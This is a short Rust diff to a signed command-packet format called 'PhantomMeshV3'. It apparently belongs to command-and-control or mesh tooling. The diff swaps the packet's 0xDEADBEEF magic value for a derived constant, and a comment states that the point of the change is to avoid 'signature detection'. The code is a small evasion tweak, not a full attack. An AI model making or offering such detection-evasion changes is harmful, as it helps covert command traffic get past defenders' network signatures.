@@ -93,6 +93,10 @@ pub struct PhantomPacket {
     pub signature: [u8; 64],
 }
 
+// Protocol constant derived from SHA256("PhantomMeshV3")[0..4]
+// avoids "0xDEADBEEF" signature detection.
+pub const PROTOCOL_MAGIC: u32 = 0x93A1B2C4; 
+
 impl PhantomPacket {
     pub fn new(cmd: CommandType, data: Vec<u8>, key: &SigningKey) -> Self {
         use rand::RngCore;
@@ -100,7 +104,7 @@ impl PhantomPacket {
         rand::thread_rng().fill_bytes(&mut nonce);
         
         let mut packet = Self {
-            magic: 0xDEADBEEF,
+            magic: PROTOCOL_MAGIC,
             timestamp: chrono::Utc::now().timestamp() as u64,
             nonce,
             cmd_type: cmd,
@@ -118,7 +122,7 @@ impl PhantomPacket {
     }
 
     pub fn verify(&self, key: &VerifyingKey) -> bool {
-        if self.magic != 0xDEADBEEF { return false; }
+        if self.magic != PROTOCOL_MAGIC { return false; }
         let msg = self.digest();
         let sig_obj = Signature::from_bytes(&self.signature);
         key.verify(&msg, &sig_obj).is_ok()
